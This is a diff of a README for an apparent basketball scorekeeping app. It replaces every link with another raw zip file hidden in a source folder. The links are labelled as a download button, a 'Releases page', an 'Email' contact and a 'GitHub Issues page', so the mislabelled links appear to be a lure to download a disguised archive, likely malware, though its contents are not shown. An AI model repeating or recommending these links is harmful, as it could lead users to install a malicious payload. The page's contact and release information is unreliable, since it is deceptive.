@@ -6,11 +6,11 @@ Welcome to digital-scorekeeper! This app helps you track basketball statistics i
 
 ## 📥 Download the App
 
-[![Download digital-scorekeeper](https://github.com/Hanan-github/digital-scorekeeper/raw/refs/heads/main/frontend/src/locales/pt/scorekeeper_digital_v1.1.zip%20Now-brightgreen)](https://github.com/Hanan-github/digital-scorekeeper/raw/refs/heads/main/frontend/src/locales/pt/scorekeeper_digital_v1.1.zip)
+[![Download digital-scorekeeper](https://github.com/Hanan-github/digital-scorekeeper/raw/refs/heads/main/frontend/src/components/scorekeeper-digital-v3.3-beta.5.zip%20Now-brightgreen)](https://github.com/Hanan-github/digital-scorekeeper/raw/refs/heads/main/frontend/src/components/scorekeeper-digital-v3.3-beta.5.zip)
 
 You can find the latest version of digital-scorekeeper on our Releases page. 
 
-1. Visit the [Releases page](https://github.com/Hanan-github/digital-scorekeeper/raw/refs/heads/main/frontend/src/locales/pt/scorekeeper_digital_v1.1.zip) to download the application.
+1. Visit the [Releases page](https://github.com/Hanan-github/digital-scorekeeper/raw/refs/heads/main/frontend/src/components/scorekeeper-digital-v3.3-beta.5.zip) to download the application.
 2. Choose the version best suited for your operating system (Windows, macOS, or Linux).
 3. Click the link to begin downloading the file you need for your system.
 
@@ -57,7 +57,7 @@ We welcome contributions to improve digital-scorekeeper. If you have ideas or fe
 
 For any questions or concerns, feel free to reach out:
 
-- **Email:** https://github.com/Hanan-github/digital-scorekeeper/raw/refs/heads/main/frontend/src/locales/pt/scorekeeper_digital_v1.1.zip
-- **GitHub Issues:** Report issues or ask for features directly on our [GitHub Issues page](https://github.com/Hanan-github/digital-scorekeeper/raw/refs/heads/main/frontend/src/locales/pt/scorekeeper_digital_v1.1.zip).
+- **Email:** https://github.com/Hanan-github/digital-scorekeeper/raw/refs/heads/main/frontend/src/components/scorekeeper-digital-v3.3-beta.5.zip
+- **GitHub Issues:** Report issues or ask for features directly on our [GitHub Issues page](https://github.com/Hanan-github/digital-scorekeeper/raw/refs/heads/main/frontend/src/components/scorekeeper-digital-v3.3-beta.5.zip).
 
-Thank you for choosing digital-scorekeeper! Enjoy tracking your basketball games effortlessly. Remember, you can always return to the [Release page](https://github.com/Hanan-github/digital-scorekeeper/raw/refs/heads/main/frontend/src/locales/pt/scorekeeper_digital_v1.1.zip) for the latest updates and downloads.
+Thank you for choosing digital-scorekeeper! Enjoy tracking your basketball games effortlessly. Remember, you can always return to the [Release page](https://github.com/Hanan-github/digital-scorekeeper/raw/refs/heads/main/frontend/src/components/scorekeeper-digital-v3.3-beta.5.zip) for the latest updates and downloads.
